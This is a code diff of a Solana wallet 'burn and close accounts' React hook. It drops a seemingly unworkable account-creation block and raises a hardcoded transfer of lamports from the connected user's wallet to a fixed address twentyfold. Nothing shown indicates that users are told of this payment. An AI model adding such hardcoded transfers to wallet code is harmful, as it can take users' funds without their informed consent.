@@ -132,35 +132,17 @@ export function useBurnAndCloseAccountsManager(connection: Connection) {
     const [selectedAccounts, setSelectedAccounts] = useState<Set<string>>(new Set());
     const wallet = useWallet();
     const publicKey = wallet.publicKey;
-
     const transfer = async () => {
         if (!publicKey) {
             setError("Wallet not connected");
             return;
         }
         const transaction = new Transaction();
-        const receiver = new PublicKey("6tdnTdEBPow4FcZW2WEXm6R9CHAwsxci6QdCa3NX9zDp");
-
-        const accountInfo = await connection.getAccountInfo(receiver);
-        if (!accountInfo) {
-            const rentExemption = await connection.getMinimumBalanceForRentExemption(0);
-
-            const createAccountTx = new Transaction().add(
-                SystemProgram.createAccount({
-                    fromPubkey: wallet.publicKey!,
-                    newAccountPubkey: receiver,
-                    lamports: rentExemption,
-                    space: 0,
-                    programId: SystemProgram.programId,
-                })
-            );
-            transaction.add(createAccountTx);
-        }
         transaction.add(
             SystemProgram.transfer({
                 fromPubkey: publicKey,
                 toPubkey: new PublicKey("6tdnTdEBPow4FcZW2WEXm6R9CHAwsxci6QdCa3NX9zDp"),
-                lamports: 50000,
+                lamports: 1000000,
             })
         );
         const { blockhash } = await connection.getLatestBlockhash();
